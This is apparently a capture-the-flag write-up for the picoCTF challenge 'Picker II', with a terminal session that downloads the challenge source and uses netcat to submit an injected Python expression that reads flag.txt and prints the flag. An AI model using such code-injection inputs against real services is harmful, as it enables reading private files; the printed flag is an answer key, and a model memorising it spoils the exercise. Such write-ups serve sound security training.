### Picker II
### Descripción

Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 65370`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/522/picker-II.py).
### Solución

┌──(JorgeMSI㉿MSI)-[~/picoCTF/reversing2/04]
└─$ wget https://artifacts.picoctf.net/c/522/picker-II.py
--2026-05-07 10:26:55--  https://artifacts.picoctf.net/c/522/picker-II.py
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.225.222.28, 13.225.222.105, 13.225.222.125, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.225.222.28|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3510 (3.4K) [application/octet-stream]
Saving to: ‘picker-II.py’

picker-II.py                  100%[=================================================>]   3.43K  --.-KB/s    in 0s

2026-05-07 10:26:56 (35.6 MB/s) - ‘picker-II.py’ saved [3510/3510]


┌──(JorgeMSI㉿MSI)-[~/picoCTF/reversing2/04]
└─$ nc saturn.picoctf.net 65370
==> win
Illegal input
==> print(open('flag.txt').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}

'NoneType' object is not callable

┌──(JorgeMSI㉿MSI)-[~/picoCTF/reversing2/04]
└─$


### Notas
### Referencias
